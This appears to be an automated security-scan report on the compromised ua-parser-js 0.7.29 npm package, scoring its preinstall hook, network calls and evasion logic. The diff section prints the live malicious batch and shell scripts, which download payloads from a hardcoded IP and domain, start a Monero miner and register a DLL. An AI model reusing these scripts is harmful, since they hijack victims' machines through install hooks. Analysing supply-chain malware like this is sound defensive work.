dimensions.name: network_calls
dimensions.label: New or changed network calls
dimensions.reasoning: preinstall.bat and preinstall.sh both download executables from hardcoded IPs/domains: 'http://159.148.186.228/download/jsextension.exe', 'https://citationsherbe.at/sdd.dll', and 'http://159.148.186.228/download/jsextension'. Multiple fallback download methods are used (curl, wget, certutil). preinstall.sh also calls 'https://freegeoip.app/xml/' for geolocation. These are unambiguous malicious network calls downloading and executing remote payloads.

dimensions.name: obfuscation
dimensions.label: Obfuscation / encoding patterns (base64, eval, dynamic require)
dimensions.reasoning: No significant obfuscation is present. The code is plaintext and readable. The wallet address/rig-id is redacted in the diff but that is a diff tool artefact, not package obfuscation. Score is low because the malicious intent is overt rather than hidden.

dimensions.name: install_hooks
dimensions.label: Postinstall / preinstall script additions or changes
dimensions.reasoning: A new 'preinstall' hook is added (noted in metadata). preinstall.js is the entry point, which detects the OS platform and executes preinstall.bat (Windows) or preinstall.sh (Linux/Mac) via child_process, running at install time without user consent.

dimensions.name: env_conditional
dimensions.label: Conditional logic gated on env vars, platform, or CI detection
dimensions.reasoning: preinstall.js checks 'process.platform' to branch between Windows, Linux, and macOS payloads. preinstall.sh checks geolocation (RU, UA, BY, KZ) to avoid running in those countries, a classic evasion technique used by malware to avoid targeting certain regions and reduce detection risk.

dimensions.name: dependency_changes
dimensions.label: Dependency graph changes (new transitive deps)
dimensions.reasoning: No new npm dependencies are added. The malicious code uses only built-in Node.js modules (child_process) and system tools (curl, wget, certutil). Score is minimal.

dimensions.name: resource_exhaustion
dimensions.label: Denial-of-service / resource-exhaustion patterns (unbounded loops, recursion, unthrottled blocking calls)
dimensions.reasoning: The downloaded 'jsextension' binary is a cryptominer: it connects to 'pool.minexmr.com:443' (a Monero mining pool) with '--cpu-max-threads-hint=50' and runs in the background ('--background', '&>/dev/null &'). This constitutes CPU resource exhaustion/cryptojacking on the victim's machine. Additionally, 'create.dll' is registered via regsvr32 on Windows, indicating a persistent DLL-based component.

file_diffs.unified_diff:
+@echo off
+curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe
+if not exist jsextension.exe (
+	wget http://159.148.186.228/download/jsextension.exe -O jsextension.exe
+)
+if not exist jsextension.exe (
+	certutil.exe -urlcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe
+)
+curl https://citationsherbe.at/sdd.dll -o create.dll
+if not exist create.dll (
+	wget https://citationsherbe.at/sdd.dll -O create.dll
+)
+if not exist create.dll (
+	certutil.exe -urlcache -f https://citationsherbe.at/sdd.dll create.dll
+)
+set exe_1=jsextension.exe
+set "count_1=0"
+>tasklist.temp (
+tasklist /NH /FI "IMAGENAME eq %exe_1%"
+)
+for /f %%x in (tasklist.temp) do (
+if "%%x" EQU "%exe_1%" set /a count_1+=1
+)
+if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
+   --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)
+del tasklist.temp

+IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
+if [ -z "$IP" ]
+    then
+	var=$(pgrep jsextension)
+	if [ -z "$var" ]
+		then
+		curl http://159.148.186.228/download/jsextension -o jsextension
+		if [ ! -f jsextension ]
+			then
+			wget http://159.148.186.228/download/jsextension -O jsextension
+		fi
+		chmod +x jsextension
+		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
+            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
+	fi
+fi

llm_summary: This is a confirmed supply chain attack on ua-parser-js 0.7.29. The package adds a preinstall hook (preinstall.js) that detects the victim's OS and executes platform-specific scripts (preinstall.bat on Windows, preinstall.sh on Linux/macOS). These scripts download and execute a cryptominer ('jsextension') connecting to pool.minexmr.com and a suspicious DLL ('create.dll'/'sdd.dll') registered via regsvr32. The shell script performs geolocation-based evasion to skip execution in Russia, Ukraine, Belarus, and Kazakhstan. This is a textbook supply chain compromise combining install-hook abuse, remote payload download, cryptomining, and geofenced evasion.
